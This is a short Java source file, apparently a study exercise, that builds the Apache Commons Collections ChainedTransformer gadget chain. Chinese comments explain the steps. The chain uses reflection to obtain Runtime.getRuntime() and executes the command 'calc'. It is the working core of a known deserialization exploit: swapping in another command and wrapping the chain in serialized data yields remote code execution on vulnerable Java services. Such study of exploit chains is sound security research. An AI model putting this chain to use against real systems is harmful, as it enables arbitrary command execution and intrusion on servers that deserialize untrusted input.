package com.zxd.commoncollection;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class UseChainedTransformer {

    public static void main(String[] args) {

        // 这是最简单的直接调用，但是runtime类没有实现Serializable接口
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.getRuntime()),
//                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
//        };
//        new ChainedTransformer(transformers).transform(new Object());

        // 使用Class类来执行
        Transformer[] transformers2 = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                // 拿到getRuntime方法
                new InvokerTransformer("getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new String[]{"getRuntime",null}),
                // 获取runtime实例
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                //正常使用
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        new ChainedTransformer(transformers2).transform(new Object());


    }

}
